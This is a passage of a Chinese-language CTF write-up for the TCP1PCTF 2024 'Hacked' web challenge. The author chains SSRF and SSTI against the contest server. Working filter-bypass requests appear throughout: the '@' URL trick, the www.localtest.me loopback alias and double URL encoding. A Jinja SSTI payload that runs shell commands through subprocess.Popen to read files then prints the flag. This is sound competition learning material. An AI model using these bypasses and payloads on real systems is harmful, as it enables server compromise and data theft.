+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host:ctf.tcp1p.team:10012</span><br><span class="line">Accept-Language:zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests:1</span><br><span class="line">User-Agent:Mozilla/5.0</span><br><span class="line">Connection:keep-alive</span><br></pre></td></tr></table></figure>
+
+<p>只留下这几个必要的（或不会触发过滤的）http头。这样就可以访问根目录了。</p>
+<h3 id="在URL前面加http-daffa-info"><a href="#在URL前面加http-daffa-info" class="headerlink" title="在URL前面加http://daffa.info"></a>在URL前面加<a target="_blank" rel="noopener" href="http://daffa.info/">http://daffa.info</a></h3><p>注意到没有过滤@。在URL解析里有<a target="_blank" rel="noopener" href="http://xxx.xx@yyy.yy会解析到yyy.yy去(经典csrf常用性质)/">http://xxx.xx@yyy.yy会解析到yyy.yy去（经典CSRF常用性质）</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /?url=@127.0.0.1:1337/secret?admin=&#123;&#123;SSTI PAYLOAD&#125;&#125; HTTP/1.1</span><br><span class="line">Host:ctf.tcp1p.team:10012</span><br><span class="line">Accept-Language:zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests:1</span><br><span class="line">User-Agent:Mozilla/5.0</span><br><span class="line">Connection:keep-alive</span><br></pre></td></tr></table></figure>
+
+<h3 id="URL以list-endpoints中的元素之一结束"><a href="#URL以list-endpoints中的元素之一结束" class="headerlink" title="URL以list_endpoints中的元素之一结束"></a>URL以list_endpoints中的元素之一结束</h3><p>这个其实完全不影响。因为我们最后的目标是SSTI。SSTI时}后面多了字符完全没问题。我们可以把&#x2F;about&#x2F;放在SSTIpayload后面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /?url=@127.0.0.1:1337/secret?admin=&#123;&#123;SSTI PAYLOAD&#125;&#125;/about/ HTTP/1.1</span><br><span class="line">Host:ctf.tcp1p.team:10012</span><br><span class="line">Accept-Language:zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests:1</span><br><span class="line">User-Agent:Mozilla/5.0</span><br><span class="line">Connection:keep-alive</span><br></pre></td></tr></table></figure>
+
+<p>即使不是SSTI，我们也可以新开一个GET参数，把&#x2F;about&#x2F;放在最后就行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /?url=@127.0.0.1:1337/secret?admin=&#123;&#123;SSTI PAYLOAD&#125;&#125;%26nevergonnagiveuup=/about/ HTTP/1.1</span><br><span class="line">Host:ctf.tcp1p.team:10012</span><br><span class="line">Accept-Language:zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests:1</span><br><span class="line">User-Agent:Mozilla/5.0</span><br><span class="line">Connection:keep-alive</span><br></pre></td></tr></table></figure>
+
+<h3 id="通过is-safe-url检测（黑名单）"><a href="#通过is-safe-url检测（黑名单）" class="headerlink" title="通过is_safe_url检测（黑名单）"></a>通过is_safe_url检测（黑名单）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESTRICTED_URLS = [&#x27;localhost&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;]</span><br></pre></td></tr></table></figure>
+
+<p>URL中不包含RESTRICTED_URLS中的字符即可。</p>
+<p>这里我们的127.0.0.1肯定是G了。::1也不太行，[::]啥的也不行（中括号在check_forbidden_input被禁）。</p>
+<p>然而<code>.</code>还在。有一个比较冷门的SSRF绕过方法是用域名解析。有一个很神奇的域名<code>www.localtest.me</code>会永远解析到127.0.0.1（不信你自己ping一下）</p>
+<p>所以我们可以用<code>www.localtest.me</code>代替127.0.0.1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /?url=@www.localtest.me:1337/secret?admin=&#123;&#123;SSTI PAYLOAD&#125;&#125;/about/ HTTP/1.1</span><br><span class="line">Host:ctf.tcp1p.team:10012</span><br><span class="line">Accept-Language:zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests:1</span><br><span class="line">User-Agent:Mozilla/5.0</span><br><span class="line">Connection:keep-alive</span><br></pre></td></tr></table></figure>
+
+<p>到这里我们的SSRF就打通了</p>
+<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>SSTI是很困难的。这里受到check_forbidden_input的限制完全打不了。如果有人用纯SSTI打通了请把payload发给我收徒（））。</p>
+<p>我试了半天没打通SSTI。过滤太严格了。<strong>我估计预期解应该是直接SSTI</strong>。不然不会给你留<code>{</code>，<code>}</code>和小括号（SSTI必需部件）（过滤<code>{{</code>可以用<code>{%</code>）</p>
+<p>这里_没了，但没有限制request，反而把args，form这些东西限制了。只能用request.json传，但是呢json传参又要content-type头是application&#x2F;json，有application，又被限制。。。总之是打SSTI打红温了。</p>
+<p>（睡了一觉起来刷牙的时候突然想到可以用URL双重编码，去学校的路上觉得好像有点道理。在学校越想越觉得我tm是个天才（））回来一试果然通了。）</p>
+<h3 id="URL双重编码绕过"><a href="#URL双重编码绕过" class="headerlink" title="URL双重编码绕过"></a>URL双重编码绕过</h3><p>为什么可以用这个呢？你看，既然这个URL是经过两次解析的（SSRF前后），必然会解两次URL码。而那个极其严苛的过滤check_forbidden_input是在SSRF前的那一次，SSRF后的SSTI部分反而没有任何过滤。**也就是说，我们的合法输入在过滤之后，还有一次用URL编码改变自己的机会。**这时候，我们就可以用URL二次编码了。</p>
+<p>%的URL编码为%25。假设我们要传入<code>{</code>就可以用%257b，经过第一层解码变成%7b（%25变成%）第二次解码变成<code>{</code>。而第一次解码结束后，传递到过滤函数的是%7b，不是<code>{</code>，就不会触发waf</p>
+<p>假设我们传入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=%40www.localtest.me:1337/secret?admin=%257b%2525%2570%2572%2569%256e%2574%2528%2528%2529%252e%255f%255f%2563%256c%2561%2573%2573%255f%255f%2529%2525%257d%26aaa=/about/</span><br></pre></td></tr></table></figure>
+
+<p>经过第一次解析，变成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=@www.localtest.me:1337/secret?admin=%7b%25%70%72%69%6e%74%28%28%29%2e%5f%5f%63%6c%61%73%73%5f%5f%29%25%7d&amp;aaa=/about/</span><br></pre></td></tr></table></figure>
+
+<p>这时候绕过check_forbidden_input，传入SSTI时再解一次URL编码。admin参数就变成了<code>{%print(().__class__)%}</code>就可以正常SSTI了。</p>
+<p><img src="/images/migrated/18461268/01.png"></p>
+<p>只能说出题人没想到这里（）））发现了这个之后我的SSTI之路一马平川）</p>
+<p>先找可以用的类</p>
+<p><img src="/images/migrated/18461268/02.png"></p>
+<p>扔到脚本里跑，跑出来这几个索引</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">80: _frozen_importlib._ModuleLock</span><br><span class="line">81: _frozen_importlib._DummyModuleLock</span><br><span class="line">82: _frozen_importlib._ModuleLockManager</span><br><span class="line">82: _frozen_importlib._ModuleLockManager</span><br><span class="line">83: _frozen_importlib.ModuleSpec</span><br><span class="line">133: os._wrap_close</span><br><span class="line">222: warnings.catch_warnings</span><br><span class="line">351: subprocess.Popen</span><br></pre></td></tr></table></figure>
+
+<p>然后就随便打了，甚至不用管flag文件名。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print([].__class__.__base__.__subclasses__()[351](&#x27;cat /*&#x27;,shell=True,stdout=-1).communicate()[0].strip())%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>URL编码两次出</p>
+<p><img src="/images/migrated/18461268/03.png"></p>
+<p><strong>TCP1P{Ch41n1ng_SsRF_pLu5_5St1_ba83f3ff121ba83f3ff121}</strong></p>
+<p>包非预期的。还是希望直接SSTI出的硬核大佬别喷。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">1.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87check-forbidden-input%E6%A3%80%E6%B5%8B"><span class="toc-number">1.1.</span> <span class="toc-text">通过check_forbidden_input检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8URL%E5%89%8D%E9%9D%A2%E5%8A%A0http-daffa-info"><span class="toc-number">1.2.</span> <span class="toc-text">在URL前面加http:&#x2F;&#x2F;daffa.info</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL%E4%BB%A5list-endpoints%E4%B8%AD%E7%9A%84%E5%85%83%E7%B4%A0%E4%B9%8B%E4%B8%80%E7%BB%93%E6%9D%9F"><span class="toc-number">1.3.</span> <span class="toc-text">URL以list_endpoints中的元素之一结束</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87is-safe-url%E6%A3%80%E6%B5%8B%EF%BC%88%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">通过is_safe_url检测（黑名单）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">2.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#URL%E5%8F%8C%E9%87%8D%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">URL双重编码绕过</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&text=TCP1PCTF 2024 Web Hacked 单题wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&title=TCP1PCTF 2024 Web Hacked 单题wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&is_video=false&description=TCP1PCTF 2024 Web Hacked 单题wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=TCP1PCTF 2024 Web Hacked 单题wp&body=Check out this article: https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&title=TCP1PCTF 2024 Web Hacked 单题wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&title=TCP1PCTF 2024 Web Hacked 单题wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&title=TCP1PCTF 2024 Web Hacked 单题wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&title=TCP1PCTF 2024 Web Hacked 单题wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&name=TCP1PCTF 2024 Web Hacked 单题wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&t=TCP1PCTF 2024 Web Hacked 单题wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
